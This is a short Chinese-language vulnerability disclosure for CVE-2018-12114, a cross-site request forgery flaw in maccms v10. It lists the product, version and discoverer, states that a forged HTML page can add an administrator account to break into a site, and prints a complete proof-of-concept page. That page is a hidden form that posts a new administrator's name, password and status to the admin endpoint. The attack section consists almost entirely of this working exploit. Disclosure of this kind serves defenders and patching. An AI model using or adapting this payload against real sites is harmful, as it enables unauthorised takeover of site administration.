### 漏洞简介  

|漏洞名称|上报日期|漏洞发现者|产品首页|软件链接|版本|CVE编号|
--------|--------|---------|--------|-------|----|------|
|maccms_v10存在CSRF漏洞可增加任意账号|2018-06-11|Bay0net|[http://www.maccms.com/](http://www.maccms.com/) | [http://www.maccms.com/down.html](http://www.maccms.com/down.html) |v10| [CVE-2018-12114](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12114)|  

#### 漏洞概述  

> 恶意攻击者可以精心伪造一个Html页面添加管理员账户对网站进行入侵。   
 
### POC实现代码如下：  

> exp代码如下：  

``` html
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://10.211.55.17/maccms10/admin.php/admin/admin/info.html" method="POST">
      <input type="hidden" name="admin_id" value="" />
      <input type="hidden" name="admin_name" value="test2" />
      <input type="hidden" name="admin_pwd" value="test2" />
      <input type="hidden" name="admin_status" value="1" />
      <input type="hidden" name="admin_auth[0]" value="index/welcome" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```
